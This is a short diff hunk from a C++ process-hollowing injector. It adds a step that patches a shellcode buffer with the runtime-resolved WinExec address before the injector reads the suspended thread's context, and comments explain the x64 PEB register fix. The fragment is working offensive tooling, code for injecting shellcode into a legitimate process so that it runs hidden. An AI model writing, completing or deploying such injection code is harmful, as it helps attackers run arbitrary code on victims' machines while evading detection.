@@ -44,6 +44,14 @@ bool ProcessHollowing(const char* targetExe, const char* shellcodePath) {
         return false;
     }
 
+    // Patch shellcode with the runtime-resolved WinExec address (commit 6).
+    // The shellcode.asm layout reserves the first 8 bytes for this address.
+    if (!PatchShellcodeWinExec(shellcode)) {
+        std::cout << "Error: failed to patch shellcode with WinExec address." << std::endl;
+        CleanupAndFail(pi);
+        return false;
+    }
+
     // Step 3: Get the suspended thread's context.
     // On x64, ctx.Rcx holds the PEB pointer (passed to LdrInitializeThunk).
     // The original code read ctx.Rdx, which is the second Win64 argument
